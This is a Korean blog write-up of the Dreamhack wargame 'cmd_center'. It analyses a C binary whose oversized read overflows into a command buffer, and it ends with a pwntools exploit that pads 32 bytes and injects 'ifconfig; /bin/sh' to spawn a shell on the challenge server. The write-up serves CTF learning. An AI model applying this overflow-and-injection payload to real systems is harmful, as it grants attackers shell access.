---
title: '[Dreamhack] cmd_center'
description: Dreamhack [Wargame] - cmd_center
author: juhyeongkim
date: 2024-10-31 6:20:00 +0900
categories: [Dreamhack, Wargame]
tags: [Dreamhack, Wargame, Pwnable]
# toc: false
# comments: false
# math: true
# mermaid: true
# image:
#   path: 
#   lqip: 
#   alt: 
---

[문제 링크](https://dreamhack.io/wargame/challenges/117)

## 바이너리 분석

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void init()
{
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
}

int main()
{

	char cmd_ip[256] = "ifconfig";
	int dummy;
	char center_name[24];

	init();

	printf("Center name: ");
	read(0, center_name, 100);

	if (!strncmp(cmd_ip, "ifconfig", 8))
	{
		system(cmd_ip);
	}

	else
	{
		printf("Something is wrong!\n");
	}
	exit(0);
}
```

![image](https://github.com/user-attachments/assets/937f31ab-22e8-466b-b8cd-7eea6ceca5cf)

먼저, `canary` 이외에는 다른 보호 기법이 전부 적용되어 있기 때문에 `BOF`를 통한 `RAO` 공격은 가능할 것인데, 바이너리에 `BOF` 취약점을 찾기 힘들기 때문에 일단 넘어가서 다른 관점에서 살펴보자.

```c
if (!strncmp(cmd_ip, "ifconfig", 8))
{
  system(cmd_ip);
}
```

먼저, `char cmd_ip[256] = "ifconfig";`의 주소에서 `8bytes`에 저장된 데이터가 `"ifconfig"`라면 `cmp_ip`를 인자로 하는 `system` 함수를 수행할 수 있게 된다.

**이 뜻은 `cmd_ip`의 앞에서부터 `8bytes` 값만 `"ifconfig"`로 유지하고 뒤에 어떤 문자열을 붙여도 해당 문자열을 `system`의 인자로 전달하여 `Command Injection` 공격을 수행할 수 있다는 것이다.**

그렇다면, **`cmd_ip`에 `"ifconfig; /bin/sh"`을 입력하는 것을 목표로 잡고 바이너리를 다시 분석해보자.**

```c
char center_name[24];

init();

printf("Center name: ");
read(0, center_name, 100);
```

여기를 보면, `center_name`에 `100bytes` 만큼 입력을 받는데, `center_name`은 크기가 `24bytes`이기 때문에 `BOF` 취약점이 발생한다.

만약 `center_name` **뒤의** `100bytes` 범위 내에 `cmd_ip`가 위치한다면 `BOF`를 통해 `cmp_ip`를 위의 목표처럼 덮어서 쉘을 획득할 수 있을 것이다.\
(참고로 `BOF` 취약점은 존재하지만, 쉘 실행 함수도 없고 `libc_base`를 구하기 힘들기 때문에 카나리가 없어도 `RAO` 공격은 힘들다.)

그럼 `gdb`를 통해 `center_name`과 `cmd_ip`의 위치를 살펴보자.

![image](https://github.com/user-attachments/assets/e61dded2-d47c-4c78-a5b1-d7a65fb6a062)

위 이미지를 보면, 

1. `read`의 두 번째 인자(`rsi`)인 `center_name`이 `[rbp-0x130]`임을 알 수 있고

2. `strncmp`의 첫 번째 인자(`rdi`)인 `cmp_ip`가 `[rbp-0x110]`임을 알 수 있다.

다행히 `cmp_ip`가 `center_name` 뒤에 위치해서 `BOF`를 통해 `center_name`에 값을 덮어서 `cmp_ip`까지 도달하여 `cmp_ip`의 문자열을 조작할 수 있다.

두 변수가 저장된 주소의 차이는 `0x20 = 32`이기 때문에 `b'a' * 0x20`을 전달해준 후, `strncmp`에 걸리지 않기 위해 `b'ifconfig'`를 붙이고, 다시 b`; /bin/sh`을 붙여서 전달해주면 될 것이다.

<br>

## Exploit

```py
from pwn import *

p = remote('host3.dreamhack.games', 15414)

payload = b'a' * 0x20    # &cmd_ip - &center_name = 0x20(32)
payload += b'ifconfig'   # strncmp 우회
payload += b'; /bin/sh'  # injection

p.sendafter(b'Center name: ', payload)

p.interactive()
```
